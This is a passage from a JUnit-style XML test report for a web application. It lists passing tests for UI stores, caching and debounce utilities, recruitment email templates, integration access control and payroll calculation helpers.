    <testcase classname="getBackgroundById returns undefined for empty string" name="getBackgroundById returns undefined for empty string" time="0.001">
    </testcase>
    <testcase classname="getBackgroundById finds any background by id" name="getBackgroundById finds any background by id" time="0.007">
    </testcase>
    <testcase classname="getBackgroundsByCategory returns backgrounds for neutral category" name="getBackgroundsByCategory returns backgrounds for neutral category" time="0.001">
    </testcase>
    <testcase classname="getBackgroundsByCategory returns backgrounds for warm category" name="getBackgroundsByCategory returns backgrounds for warm category" time="0.002">
    </testcase>
    <testcase classname="getBackgroundsByCategory returns backgrounds for cool category" name="getBackgroundsByCategory returns backgrounds for cool category" time="0.002">
    </testcase>
    <testcase classname="getBackgroundsByCategory returns backgrounds for nature category" name="getBackgroundsByCategory returns backgrounds for nature category" time="0.002">
    </testcase>
    <testcase classname="getBackgroundsByCategory all categories combined equal full list" name="getBackgroundsByCategory all categories combined equal full list" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="useSidebarStore" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:02" time="0.76" tests="17">
    <testcase classname="useSidebarStore initial state starts expanded" name="useSidebarStore initial state starts expanded" time="0.004">
    </testcase>
    <testcase classname="useSidebarStore initial state starts with mobile menu closed" name="useSidebarStore initial state starts with mobile menu closed" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore toggle toggles collapsed from false to true" name="useSidebarStore toggle toggles collapsed from false to true" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore toggle toggles collapsed from true to false" name="useSidebarStore toggle toggles collapsed from true to false" time="0.002">
    </testcase>
    <testcase classname="useSidebarStore toggle does not affect mobileOpen state" name="useSidebarStore toggle does not affect mobileOpen state" time="0.002">
    </testcase>
    <testcase classname="useSidebarStore setCollapsed sets collapsed to true" name="useSidebarStore setCollapsed sets collapsed to true" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore setCollapsed sets collapsed to false" name="useSidebarStore setCollapsed sets collapsed to false" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore setMobileOpen sets mobileOpen to true" name="useSidebarStore setMobileOpen sets mobileOpen to true" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore setMobileOpen sets mobileOpen to false" name="useSidebarStore setMobileOpen sets mobileOpen to false" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore persist skips hydration configures skipHydration true in persist options" name="useSidebarStore persist skips hydration configures skipHydration true in persist options" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore — selectors useSidebarCollapsed returns initial false" name="useSidebarStore — selectors useSidebarCollapsed returns initial false" time="0.004">
    </testcase>
    <testcase classname="useSidebarStore — selectors useSidebarCollapsed returns true after toggle" name="useSidebarStore — selectors useSidebarCollapsed returns true after toggle" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore — selectors useSidebarMobileOpen returns initial false" name="useSidebarStore — selectors useSidebarMobileOpen returns initial false" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore — selectors useSidebarMobileOpen returns true after setMobileOpen" name="useSidebarStore — selectors useSidebarMobileOpen returns true after setMobileOpen" time="0">
    </testcase>
    <testcase classname="useSidebarStore — selectors useSidebarToggle returns the toggle function" name="useSidebarStore — selectors useSidebarToggle returns the toggle function" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore — selectors useSidebarSetCollapsed can set to true" name="useSidebarStore — selectors useSidebarSetCollapsed can set to true" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore — selectors useSidebarSetMobileOpen can set to false" name="useSidebarStore — selectors useSidebarSetMobileOpen can set to false" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="debounce" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:02" time="0.807" tests="60">
    <testcase classname="debounce delays function execution" name="debounce delays function execution" time="0.004">
    </testcase>
    <testcase classname="debounce calls function only once for rapid calls" name="debounce calls function only once for rapid calls" time="0.001">
    </testcase>
    <testcase classname="debounce passes the latest arguments" name="debounce passes the latest arguments" time="0.002">
    </testcase>
    <testcase classname="debounce resets timer on each call" name="debounce resets timer on each call" time="0.001">
    </testcase>
    <testcase classname="debounce handles zero wait time" name="debounce handles zero wait time" time="0.001">
    </testcase>
    <testcase classname="debounce handles multiple eventual debounced calls" name="debounce handles multiple eventual debounced calls" time="0.002">
    </testcase>
    <testcase classname="debounce does not call function before wait time" name="debounce does not call function before wait time" time="0.001">
    </testcase>
    <testcase classname="debounce handles no arguments" name="debounce handles no arguments" time="0">
    </testcase>
    <testcase classname="debounce handles multiple numeric arguments" name="debounce handles multiple numeric arguments" time="0.001">
    </testcase>
    <testcase classname="debounce works with large wait times" name="debounce works with large wait times" time="0.001">
    </testcase>
    <testcase classname="throttle calls function immediately first time" name="throttle calls function immediately first time" time="0.001">
    </testcase>
    <testcase classname="throttle ignores calls within limit period" name="throttle ignores calls within limit period" time="0.001">
    </testcase>
    <testcase classname="throttle allows call after limit period" name="throttle allows call after limit period" time="0.002">
    </testcase>
    <testcase classname="throttle passes arguments to the function" name="throttle passes arguments to the function" time="0">
    </testcase>
    <testcase classname="throttle uses the first call arguments within limit period" name="throttle uses the first call arguments within limit period" time="0">
    </testcase>
    <testcase classname="throttle handles no arguments" name="throttle handles no arguments" time="0">
    </testcase>
    <testcase classname="throttle works in rapid succession with long intervals" name="throttle works in rapid succession with long intervals" time="0.003">
    </testcase>
    <testcase classname="throttle allows one additional call via trailing edge" name="throttle allows one additional call via trailing edge" time="0.001">
    </testcase>
    <testcase classname="getCached / setCache / clearCache returns null for empty cache" name="getCached / setCache / clearCache returns null for empty cache" time="0.001">
    </testcase>
    <testcase classname="getCached / setCache / clearCache stores and retrieves values" name="getCached / setCache / clearCache stores and retrieves values" time="0.001">
    </testcase>
    <testcase classname="getCached / setCache / clearCache returns null for expired cache" name="getCached / setCache / clearCache returns null for expired cache" time="0.002">
    </testcase>
    <testcase classname="getCached / setCache / clearCache returns data within TTL" name="getCached / setCache / clearCache returns data within TTL" time="0.001">
    </testcase>
    <testcase classname="getCached / setCache / clearCache supports custom TTL" name="getCached / setCache / clearCache supports custom TTL" time="0.002">
    </testcase>
    <testcase classname="getCached / setCache / clearCache stores various data types" name="getCached / setCache / clearCache stores various data types" time="0.002">
    </testcase>
    <testcase classname="getCached / setCache / clearCache overwrites existing keys" name="getCached / setCache / clearCache overwrites existing keys" time="0.001">
    </testcase>
    <testcase classname="getCached / setCache / clearCache clearCache removes all entries" name="getCached / setCache / clearCache clearCache removes all entries" time="0.002">
    </testcase>
    <testcase classname="getCached / setCache / clearCache clearCache removes specific key" name="getCached / setCache / clearCache clearCache removes specific key" time="0.001">
    </testcase>
    <testcase classname="getCached / setCache / clearCache clearCache on non-existent key does not throw" name="getCached / setCache / clearCache clearCache on non-existent key does not throw" time="0.001">
    </testcase>
    <testcase classname="getCached / setCache / clearCache handles chained operations" name="getCached / setCache / clearCache handles chained operations" time="0.002">
    </testcase>
    <testcase classname="getCached / setCache / clearCache stores large arrays" name="getCached / setCache / clearCache stores large arrays" time="0.001">
    </testcase>
    <testcase classname="getCached / setCache / clearCache stores nested objects" name="getCached / setCache / clearCache stores nested objects" time="0">
    </testcase>
    <testcase classname="perf.mark / perf.measure / perf.getAllMetrics perf.mark does not throw" name="perf.mark / perf.measure / perf.getAllMetrics perf.mark does not throw" time="0.001">
    </testcase>
    <testcase classname="perf.mark / perf.measure / perf.getAllMetrics perf.measure returns a number (may be 0 in jsdom)" name="perf.mark / perf.measure / perf.getAllMetrics perf.measure returns a number (may be 0 in jsdom)" time="0.001">
    </testcase>
    <testcase classname="perf.mark / perf.measure / perf.getAllMetrics perf.measure returns 0 when performance API is missing" name="perf.mark / perf.measure / perf.getAllMetrics perf.measure returns 0 when performance API is missing" time="0.001">
    </testcase>
    <testcase classname="perf.mark / perf.measure / perf.getAllMetrics perf.mark does not throw when performance is undefined" name="perf.mark / perf.measure / perf.getAllMetrics perf.mark does not throw when performance is undefined" time="0.001">
    </testcase>
    <testcase classname="perf.mark / perf.measure / perf.getAllMetrics perf.getAllMetrics does not throw when performance is defined" name="perf.mark / perf.measure / perf.getAllMetrics perf.getAllMetrics does not throw when performance is defined" time="0.001">
    </testcase>
    <testcase classname="perf.mark / perf.measure / perf.getAllMetrics perf.getAllMetrics returns object structure when performance is defined" name="perf.mark / perf.measure / perf.getAllMetrics perf.getAllMetrics returns object structure when performance is defined" time="0.002">
    </testcase>
    <testcase classname="createLazyObserver returns null or an IntersectionObserver instance depending on environment" name="createLazyObserver returns null or an IntersectionObserver instance depending on environment" time="0.001">
    </testcase>
    <testcase classname="createLazyObserver returns null when IntersectionObserver is not available" name="createLazyObserver returns null when IntersectionObserver is not available" time="0.001">
    </testcase>
    <testcase classname="prefetchRoute / preconnect prefetchRoute creates a prefetch link element" name="prefetchRoute / preconnect prefetchRoute creates a prefetch link element" time="0.007">
    </testcase>
    <testcase classname="prefetchRoute / preconnect preconnect creates a preconnect link element" name="prefetchRoute / preconnect preconnect creates a preconnect link element" time="0.003">
    </testcase>
    <testcase classname="prefetchRoute / preconnect prefetchRoute handles invalid href gracefully (does not throw)" name="prefetchRoute / preconnect prefetchRoute handles invalid href gracefully (does not throw)" time="0.001">
    </testcase>
    <testcase classname="prefetchRoute / preconnect preconnect does nothing when document is undefined" name="prefetchRoute / preconnect preconnect does nothing when document is undefined" time="0.001">
    </testcase>
    <testcase classname="prefetchRoute / preconnect prefetchRoute does nothing when document is undefined" name="prefetchRoute / preconnect prefetchRoute does nothing when document is undefined" time="0.002">
    </testcase>
    <testcase classname="calculatePerformanceScore returns a number between 0 and 100" name="calculatePerformanceScore returns a number between 0 and 100" time="0.025">
    </testcase>
    <testcase classname="calculatePerformanceScore returns 0 when navigation timing is missing" name="calculatePerformanceScore returns 0 when navigation timing is missing" time="0.001">
    </testcase>
    <testcase classname="reportWebVitals does not throw when called with a metric object" name="reportWebVitals does not throw when called with a metric object" time="0.001">
    </testcase>
    <testcase classname="reportWebVitals handles CLS metric (multiplied by 1000)" name="reportWebVitals handles CLS metric (multiplied by 1000)" time="0.001">
    </testcase>
    <testcase classname="logBundleSize does not throw when called" name="logBundleSize does not throw when called" time="0.001">
    </testcase>
    <testcase classname="cache - parameterized handles multiple keys" name="cache - parameterized handles multiple keys" time="0.001">
    </testcase>
    <testcase classname="cache - parameterized overwrites and clears specific" name="cache - parameterized overwrites and clears specific" time="0.001">
    </testcase>
    <testcase classname="cache - parameterized stores type: string" name="cache - parameterized stores type: string" time="0.001">
    </testcase>
    <testcase classname="cache - parameterized stores type: number" name="cache - parameterized stores type: number" time="0">
    </testcase>
    <testcase classname="cache - parameterized stores type: boolean" name="cache - parameterized stores type: boolean" time="0">
    </testcase>
    <testcase classname="cache - parameterized stores type: null" name="cache - parameterized stores type: null" time="0.001">
    </testcase>
    <testcase classname="cache - parameterized stores and retrieves key x" name="cache - parameterized stores and retrieves key x" time="0.001">
    </testcase>
    <testcase classname="cache - parameterized stores and retrieves key y" name="cache - parameterized stores and retrieves key y" time="0">
    </testcase>
    <testcase classname="cache - parameterized stores and retrieves key z" name="cache - parameterized stores and retrieves key z" time="0.001">
    </testcase>
    <testcase classname="cache - parameterized stores and retrieves key w" name="cache - parameterized stores and retrieves key w" time="0.001">
    </testcase>
    <testcase classname="cache - parameterized stores and retrieves key v" name="cache - parameterized stores and retrieves key v" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="useAuthStore" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:02" time="0.839" tests="27">
    <testcase classname="useAuthStore starts unauthenticated with no user" name="useAuthStore starts unauthenticated with no user" time="0.008">
    </testcase>
    <testcase classname="useAuthStore setUser sets user and marks authenticated" name="useAuthStore setUser sets user and marks authenticated" time="0.003">
    </testcase>
    <testcase classname="useAuthStore login sets user and marks authenticated" name="useAuthStore login sets user and marks authenticated" time="0.001">
    </testcase>
    <testcase classname="useAuthStore logout clears all auth state" name="useAuthStore logout clears all auth state" time="0.002">
    </testcase>
    <testcase classname="useAuthStore setUser sets needsOnboarding when org is missing" name="useAuthStore setUser sets needsOnboarding when org is missing" time="0.001">
    </testcase>
    <testcase classname="useAuthStore setUser sets needsOnboarding=false when org present and approved" name="useAuthStore setUser sets needsOnboarding=false when org present and approved" time="0.001">
    </testcase>
    <testcase classname="useAuthStore validateAndCleanup calls logout when user exists but not authenticated" name="useAuthStore validateAndCleanup calls logout when user exists but not authenticated" time="0.002">
    </testcase>
    <testcase classname="useAuthStore handles user with full details" name="useAuthStore handles user with full details" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore starts with sidebar not collapsed on desktop" name="useSidebarStore starts with sidebar not collapsed on desktop" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore toggle flips collapsed" name="useSidebarStore toggle flips collapsed" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore setCollapsed sets the value directly" name="useSidebarStore setCollapsed sets the value directly" time="0">
    </testcase>
    <testcase classname="useSidebarStore setMobileOpen changes mobileOpen" name="useSidebarStore setMobileOpen changes mobileOpen" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore handles multiple state changes" name="useSidebarStore handles multiple state changes" time="0.001">
    </testcase>
    <testcase classname="useSidebarStore starts with mobileOpen false" name="useSidebarStore starts with mobileOpen false" time="0.001">
    </testcase>
    <testcase classname="useOrgSelectorStore starts with no organization selected" name="useOrgSelectorStore starts with no organization selected" time="0.001">
    </testcase>
    <testcase classname="useOrgSelectorStore setSelectedOrgId sets the org id" name="useOrgSelectorStore setSelectedOrgId sets the org id" time="0.001">
    </testcase>
    <testcase classname="useOrgSelectorStore setSelectedOrgId can set to null" name="useOrgSelectorStore setSelectedOrgId can set to null" time="0.001">
    </testcase>
    <testcase classname="useOrgSelectorStore setSelectedOrgId can update to different org" name="useOrgSelectorStore setSelectedOrgId can update to different org" time="0.001">
    </testcase>
    <testcase classname="useOrgSelectorStore clearSelection resets to null" name="useOrgSelectorStore clearSelection resets to null" time="0.001">
    </testcase>
    <testcase classname="useCookieConsent starts with no consent" name="useCookieConsent starts with no consent" time="0.002">
    </testcase>
    <testcase classname="useCookieConsent acceptAll sets all preferences to true" name="useCookieConsent acceptAll sets all preferences to true" time="0.001">
    </testcase>
    <testcase classname="useCookieConsent rejectAll keeps only necessary" name="useCookieConsent rejectAll keeps only necessary" time="0.001">
    </testcase>
    <testcase classname="useCookieConsent savePreferences saves custom preferences" name="useCookieConsent savePreferences saves custom preferences" time="0.002">
    </testcase>
    <testcase classname="useCookieConsent savePreferences always sets necessary to true" name="useCookieConsent savePreferences always sets necessary to true" time="0.001">
    </testcase>
    <testcase classname="useCookieConsent resetConsent clears consent" name="useCookieConsent resetConsent clears consent" time="0.001">
    </testcase>
    <testcase classname="useCookieConsent openSettings shows settings panel" name="useCookieConsent openSettings shows settings panel" time="0">
    </testcase>
    <testcase classname="useCookieConsent closeSettings hides settings panel" name="useCookieConsent closeSettings hides settings panel" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="applicationConfirmationTemplate" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:02" time="0.788" tests="27">
    <testcase classname="applicationConfirmationTemplate returns correct subject" name="applicationConfirmationTemplate returns correct subject" time="0.002">
    </testcase>
    <testcase classname="applicationConfirmationTemplate includes candidate name in HTML" name="applicationConfirmationTemplate includes candidate name in HTML" time="0.001">
    </testcase>
    <testcase classname="applicationConfirmationTemplate includes vacancy title in HTML" name="applicationConfirmationTemplate includes vacancy title in HTML" time="0">
    </testcase>
    <testcase classname="applicationConfirmationTemplate includes application date in HTML" name="applicationConfirmationTemplate includes application date in HTML" time="0.002">
    </testcase>
    <testcase classname="applicationConfirmationTemplate includes portal link when provided" name="applicationConfirmationTemplate includes portal link when provided" time="0.001">
    </testcase>
    <testcase classname="applicationConfirmationTemplate does not include portal link when not provided" name="applicationConfirmationTemplate does not include portal link when not provided" time="0.001">
    </testcase>
    <testcase classname="interviewInvitationTemplate returns correct subject" name="interviewInvitationTemplate returns correct subject" time="0">
    </testcase>
    <testcase classname="interviewInvitationTemplate includes interview type label" name="interviewInvitationTemplate includes interview type label" time="0">
    </testcase>
    <testcase classname="interviewInvitationTemplate includes interview date and time" name="interviewInvitationTemplate includes interview date and time" time="0.001">
    </testcase>
    <testcase classname="interviewInvitationTemplate includes interviewer name" name="interviewInvitationTemplate includes interviewer name" time="0.001">
    </testcase>
    <testcase classname="interviewInvitationTemplate includes location when provided" name="interviewInvitationTemplate includes location when provided" time="0.001">
    </testcase>
    <testcase classname="interviewInvitationTemplate includes meeting link when provided" name="interviewInvitationTemplate includes meeting link when provided" time="0">
    </testcase>
    <testcase classname="interviewInvitationTemplate includes additional notes when provided" name="interviewInvitationTemplate includes additional notes when provided" time="0.001">
    </testcase>
    <testcase classname="interviewInvitationTemplate handles all interview types" name="interviewInvitationTemplate handles all interview types" time="0.001">
    </testcase>
    <testcase classname="offerLetterTemplate returns correct subject" name="offerLetterTemplate returns correct subject" time="0.001">
    </testcase>
    <testcase classname="offerLetterTemplate includes congratulations message" name="offerLetterTemplate includes congratulations message" time="0.001">
    </testcase>
    <testcase classname="offerLetterTemplate includes all offer details" name="offerLetterTemplate includes all offer details" time="0.001">
    </testcase>
    <testcase classname="offerLetterTemplate includes offer expiry date" name="offerLetterTemplate includes offer expiry date" time="0">
    </testcase>
    <testcase classname="offerLetterTemplate includes contact email" name="offerLetterTemplate includes contact email" time="0">
    </testcase>
    <testcase classname="offerLetterTemplate includes contact phone when provided" name="offerLetterTemplate includes contact phone when provided" time="0.001">
    </testcase>
    <testcase classname="rejectionNoticeTemplate returns correct subject" name="rejectionNoticeTemplate returns correct subject" time="0.001">
    </testcase>
    <testcase classname="rejectionNoticeTemplate includes candidate name" name="rejectionNoticeTemplate includes candidate name" time="0">
    </testcase>
    <testcase classname="rejectionNoticeTemplate includes vacancy title" name="rejectionNoticeTemplate includes vacancy title" time="0.001">
    </testcase>
    <testcase classname="rejectionNoticeTemplate includes rejection date" name="rejectionNoticeTemplate includes rejection date" time="0">
    </testcase>
    <testcase classname="rejectionNoticeTemplate includes feedback when provided" name="rejectionNoticeTemplate includes feedback when provided" time="0.001">
    </testcase>
    <testcase classname="rejectionNoticeTemplate includes encouragement to reapply when enabled" name="rejectionNoticeTemplate includes encouragement to reapply when enabled" time="0.001">
    </testcase>
    <testcase classname="rejectionNoticeTemplate does not include encouragement when disabled" name="rejectionNoticeTemplate does not include encouragement when disabled" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="integrations.saveIntegrationConfig" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:02" time="0.919" tests="19">
    <testcase classname="integrations.saveIntegrationConfig rejects unauthenticated caller" name="integrations.saveIntegrationConfig rejects unauthenticated caller" time="0.034">
    </testcase>
    <testcase classname="integrations.saveIntegrationConfig rejects employee caller" name="integrations.saveIntegrationConfig rejects employee caller" time="0.002">
    </testcase>
    <testcase classname="integrations.saveIntegrationConfig rejects admin from other org" name="integrations.saveIntegrationConfig rejects admin from other org" time="0.001">
    </testcase>
    <testcase classname="integrations.saveIntegrationConfig rejects supervisor" name="integrations.saveIntegrationConfig rejects supervisor" time="0.002">
    </testcase>
    <testcase classname="integrations.saveIntegrationConfig creates new config for same-org admin" name="integrations.saveIntegrationConfig creates new config for same-org admin" time="0.003">
    </testcase>
    <testcase classname="integrations.saveIntegrationConfig updates existing config, merging old fields" name="integrations.saveIntegrationConfig updates existing config, merging old fields" time="0.001">
    </testcase>
    <testcase classname="integrations.saveIntegrationConfig does not persist masked secrets" name="integrations.saveIntegrationConfig does not persist masked secrets" time="0.001">
    </testcase>
    <testcase classname="integrations.saveIntegrationConfig allows superadmin from any org" name="integrations.saveIntegrationConfig allows superadmin from any org" time="0.001">
    </testcase>
    <testcase classname="integrations.saveIntegrationConfig audit-logs the save" name="integrations.saveIntegrationConfig audit-logs the save" time="0.002">
    </testcase>
    <testcase classname="integrations.getIntegrationConfig returns null for unauthenticated" name="integrations.getIntegrationConfig returns null for unauthenticated" time="0.001">
    </testcase>
    <testcase classname="integrations.getIntegrationConfig returns null for non-admin" name="integrations.getIntegrationConfig returns null for non-admin" time="0.001">
    </testcase>
    <testcase classname="integrations.getIntegrationConfig masks secrets in returned config" name="integrations.getIntegrationConfig masks secrets in returned config" time="0.001">
    </testcase>
    <testcase classname="integrations.getAllIntegrationConfigs returns empty for non-admin" name="integrations.getAllIntegrationConfigs returns empty for non-admin" time="0.001">
    </testcase>
    <testcase classname="integrations.getAllIntegrationConfigs returns masked configs for admin" name="integrations.getAllIntegrationConfigs returns masked configs for admin" time="0">
    </testcase>
    <testcase classname="integrations.assertCanSync returns false for unauthenticated" name="integrations.assertCanSync returns false for unauthenticated" time="0.001">
    </testcase>
    <testcase classname="integrations.assertCanSync returns false for employee" name="integrations.assertCanSync returns false for employee" time="0.001">
    </testcase>
    <testcase classname="integrations.assertCanSync returns true for same-org admin" name="integrations.assertCanSync returns true for same-org admin" time="0">
    </testcase>
    <testcase classname="integrations.assertCanSync returns false for cross-org admin" name="integrations.assertCanSync returns false for cross-org admin" time="0.001">
    </testcase>
    <testcase classname="integrations.assertCanSync returns true for superadmin" name="integrations.assertCanSync returns true for superadmin" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="getHealth (strategyMaps)" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:03" time="0.68" tests="14">
    <testcase classname="getHealth (strategyMaps) returns completed when status is completed regardless of progress" name="getHealth (strategyMaps) returns completed when status is completed regardless of progress" time="0.005">
    </testcase>
    <testcase classname="getHealth (strategyMaps) returns draft when status is draft" name="getHealth (strategyMaps) returns draft when status is draft" time="0">
    </testcase>
    <testcase classname="getHealth (strategyMaps) returns draft when status is cancelled" name="getHealth (strategyMaps) returns draft when status is cancelled" time="0">
    </testcase>
    <testcase classname="getHealth (strategyMaps) returns on_track for progress &gt;= 70 on active objectives" name="getHealth (strategyMaps) returns on_track for progress &gt;= 70 on active objectives" time="0.001">
    </testcase>
    <testcase classname="getHealth (strategyMaps) returns at_risk for progress between 40 and 69 on active objectives" name="getHealth (strategyMaps) returns at_risk for progress between 40 and 69 on active objectives" time="0.002">
    </testcase>
    <testcase classname="getHealth (strategyMaps) returns behind for progress &lt; 40 on active objectives" name="getHealth (strategyMaps) returns behind for progress &lt; 40 on active objectives" time="0.001">
    </testcase>
    <testcase classname="getHealth (strategyMaps) handles boundary values correctly" name="getHealth (strategyMaps) handles boundary values correctly" time="0.001">
    </testcase>
    <testcase classname="getHealth (strategyMaps) handles negative progress (edge case)" name="getHealth (strategyMaps) handles negative progress (edge case)" time="0">
    </testcase>
    <testcase classname="getHealth (strategyMaps) handles progress over 100 (edge case)" name="getHealth (strategyMaps) handles progress over 100 (edge case)" time="0">
    </testcase>
    <testcase classname="getHealth (strategyMaps) handles unknown status gracefully" name="getHealth (strategyMaps) handles unknown status gracefully" time="0">
    </testcase>
    <testcase classname="Strategy Maps — progress color mapping returns emerald for high progress" name="Strategy Maps — progress color mapping returns emerald for high progress" time="0.001">
    </testcase>
    <testcase classname="Strategy Maps — progress color mapping returns amber for medium progress" name="Strategy Maps — progress color mapping returns amber for medium progress" time="0.001">
    </testcase>
    <testcase classname="Strategy Maps — progress color mapping returns red for low progress" name="Strategy Maps — progress color mapping returns red for low progress" time="0.001">
    </testcase>
    <testcase classname="Strategy Maps — progress color mapping has consistent color boundaries with getHealth" name="Strategy Maps — progress color mapping has consistent color boundaries with getHealth" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="CATALOG data" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:03" time="0.825" tests="15">
    <testcase classname="CATALOG data has all 8 templates" name="CATALOG data has all 8 templates" time="0.002">
    </testcase>
    <testcase classname="CATALOG data all templates have required fields" name="CATALOG data all templates have required fields" time="0.02">
    </testcase>
    <testcase classname="CATALOG data each locale has title and body" name="CATALOG data each locale has title and body" time="0.011">
    </testcase>
    <testcase classname="CATALOG data has unique ids" name="CATALOG data has unique ids" time="0.001">
    </testcase>
    <testcase classname="CATALOG data has at least one template per category" name="CATALOG data has at least one template per category" time="0.002">
    </testcase>
    <testcase classname="getCatalogTemplate returns template for valid id" name="getCatalogTemplate returns template for valid id" time="0.001">
    </testcase>
    <testcase classname="getCatalogTemplate returns undefined for unknown id" name="getCatalogTemplate returns undefined for unknown id" time="0.001">
    </testcase>
    <testcase classname="getCatalogTemplate finds all templates by id" name="getCatalogTemplate finds all templates by id" time="0.002">
    </testcase>
    <testcase classname="localizedContent returns English content for en" name="localizedContent returns English content for en" time="0">
    </testcase>
    <testcase classname="localizedContent returns Russian content for ru" name="localizedContent returns Russian content for ru" time="0">
    </testcase>
    <testcase classname="localizedContent returns German content for de" name="localizedContent returns German content for de" time="0.001">
    </testcase>
    <testcase classname="localizedContent returns Armenian content for hy" name="localizedContent returns Armenian content for hy" time="0">
    </testcase>
    <testcase classname="localizedContent falls back to English for unknown locale" name="localizedContent falls back to English for unknown locale" time="0">
    </testcase>
    <testcase classname="CATEGORY_LABELS has labels for all categories in all locales" name="CATEGORY_LABELS has labels for all categories in all locales" time="0.003">
    </testcase>
    <testcase classname="ACCENT_HEX returns hex colors for all accents" name="ACCENT_HEX returns hex colors for all accents" time="0.006">
    </testcase>
  </testsuite>
  <testsuite name="isRestrictedOrganization" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:03" time="0.654" tests="9">
    <testcase classname="isRestrictedOrganization returns true for exact match &quot;ADB-ARRM&quot;" name="isRestrictedOrganization returns true for exact match &quot;ADB-ARRM&quot;" time="0.009">
    </testcase>
    <testcase classname="isRestrictedOrganization returns true for case-insensitive match" name="isRestrictedOrganization returns true for case-insensitive match" time="0.002">
    </testcase>
    <testcase classname="isRestrictedOrganization returns true for match with whitespace" name="isRestrictedOrganization returns true for match with whitespace" time="0.001">
    </testcase>
    <testcase classname="isRestrictedOrganization returns false for non-matching names" name="isRestrictedOrganization returns false for non-matching names" time="0.001">
    </testcase>
    <testcase classname="validateRestrictedAccess returns allowed when org name matches" name="validateRestrictedAccess returns allowed when org name matches" time="0.002">
    </testcase>
    <testcase classname="validateRestrictedAccess returns allowed when org slug matches" name="validateRestrictedAccess returns allowed when org slug matches" time="0.001">
    </testcase>
    <testcase classname="validateRestrictedAccess returns not allowed when neither matches" name="validateRestrictedAccess returns not allowed when neither matches" time="0.001">
    </testcase>
    <testcase classname="validateRestrictedAccess handles case-insensitive matching" name="validateRestrictedAccess handles case-insensitive matching" time="0.001">
    </testcase>
    <testcase classname="validateRestrictedAccess handles empty inputs" name="validateRestrictedAccess handles empty inputs" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="calculateEffectiveTaxRate" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:03" time="0.871" tests="64">
    <testcase classname="calculateEffectiveTaxRate calculates correct rate" name="calculateEffectiveTaxRate calculates correct rate" time="0.002">
    </testcase>
    <testcase classname="calculateEffectiveTaxRate returns 0 for zero gross" name="calculateEffectiveTaxRate returns 0 for zero gross" time="0">
    </testcase>
    <testcase classname="calculateEffectiveTaxRate rounds to 2 decimal places" name="calculateEffectiveTaxRate rounds to 2 decimal places" time="0.001">
    </testcase>
    <testcase classname="calculateEffectiveTaxRate handles 100% tax rate" name="calculateEffectiveTaxRate handles 100% tax rate" time="0.001">
    </testcase>
    <testcase classname="getPayrollSummary calculates totals correctly" name="getPayrollSummary calculates totals correctly" time="0.003">
    </testcase>
    <testcase classname="getPayrollSummary calculates average salary correctly" name="getPayrollSummary calculates average salary correctly" time="0">
    </testcase>
    <testcase classname="getPayrollSummary finds highest and lowest salaries" name="getPayrollSummary finds highest and lowest salaries" time="0">
    </testcase>
    <testcase classname="getPayrollSummary counts employees correctly" name="getPayrollSummary counts employees correctly" time="0">
    </testcase>
    <testcase classname="getPayrollSummary handles empty array" name="getPayrollSummary handles empty array" time="0.001">
    </testcase>
    <testcase classname="filterPayrollRuns filters by status" name="filterPayrollRuns filters by status" time="0.002">
    </testcase>
    <testcase classname="filterPayrollRuns filters by period" name="filterPayrollRuns filters by period" time="0">
    </testcase>
    <testcase classname="filterPayrollRuns filters by search text (case-insensitive)" name="filterPayrollRuns filters by search text (case-insensitive)" time="0.004">
    </testcase>
    <testcase classname="filterPayrollRuns combines multiple filters" name="filterPayrollRuns combines multiple filters" time="0.021">
    </testcase>
    <testcase classname="filterPayrollRuns sorts by createdAt descending" name="filterPayrollRuns sorts by createdAt descending" time="0.001">
    </testcase>
    <testcase classname="filterPayrollRuns returns all runs when no filters applied" name="filterPayrollRuns returns all runs when no filters applied" time="0.001">
    </testcase>
    <testcase classname="getStatusColor returns green for paid" name="getStatusColor returns green for paid" time="0">
    </testcase>
    <testcase classname="getStatusColor returns blue for calculated" name="getStatusColor returns blue for calculated" time="0.001">
    </testcase>
    <testcase classname="getStatusColor returns red for cancelled" name="getStatusColor returns red for cancelled" time="0">
    </testcase>
    <testcase classname="getStatusColor returns gray for unknown status" name="getStatusColor returns gray for unknown status" time="0">
    </testcase>
    <testcase classname="formatCurrency formats with AMD by default" name="formatCurrency formats with AMD by default" time="0.011">
    </testcase>
    <testcase classname="formatCurrency formats with specified currency" name="formatCurrency formats with specified currency" time="0.001">
    </testcase>
    <testcase classname="formatCurrency handles zero" name="formatCurrency handles zero" time="0">
    </testcase>
    <testcase classname="formatCurrency has no fraction digits" name="formatCurrency has no fraction digits" time="0.001">
    </testcase>
    <testcase classname="formatDate formats timestamp to locale date" name="formatDate formats timestamp to locale date" time="0.001">
    </testcase>
    <testcase classname="formatDateTime formats timestamp to locale date and time" name="formatDateTime formats timestamp to locale date and time" time="0.002">
    </testcase>
    <testcase classname="formatDateTime handles Russian locale" name="formatDateTime handles Russian locale" time="0.002">
    </testcase>
